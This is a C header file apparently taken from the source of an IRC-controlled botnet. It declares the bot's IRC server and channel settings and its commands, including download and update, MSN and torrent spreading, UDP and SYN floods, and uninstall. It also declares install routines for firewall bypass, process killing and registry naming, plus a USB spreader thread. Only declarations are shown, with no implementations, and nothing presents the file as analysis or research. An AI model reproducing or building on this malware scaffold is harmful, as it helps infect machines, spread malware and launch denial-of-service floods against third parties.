extern char				 cfg_mutex[];

extern unsigned long	 cfg_reconnectsleep; // msec
extern unsigned long	 cfg_ircmaxwaittime; // sec

//configurable info
extern char					cfg_host[];
extern unsigned short		cfg_port;
extern char					cfg_srvpass[];
extern char					cfg_hostname[];
extern char					cfg_channel[];
extern char					cfg_chanpass[];
extern char					cfg_p[];
extern char					ChanSafe[];

extern thread_s		threads[MAX_THREADS];
extern char			cfg_servicename[];
extern char			cfg_mutex[];
extern char			cfg_filename[];

//commands
extern char			cmd_ver[];
extern char			cmd_join[];
extern char			cmd_part[];

extern char			cmd_sort[];
extern char			cmd_unsort[];
extern char			cmd_protect[];
extern char			cmd_protectleave[];

extern char			cmd_download[];
extern char			cmd_update[];
extern char			cmd_uninstall[];
extern char			cmd_clean[];

extern char			cmd_msn[];
extern char			cmd_torrent[];
extern char			cmd_popup[];
extern char			cmd_udp[];
extern char			cmd_ssyn[];

//installation stuff
extern char			fbyp[];
extern char			szRegname[];
extern char			gotopth[];
extern char			exename[];
extern char			installrand[];
extern int			fwlbypass(char* bot);
extern int			killproc(char* exename);
extern int			view_(char* website);
extern bool			IsNew();


extern HANDLE		xetum;

extern char			versionInfo[];


//Threads
DWORD WINAPI USB_Spreader(LPVOID param);
DWORD WINAPI view(LPVOID param);
DWORD WINAPI cHTTP(LPVOID param);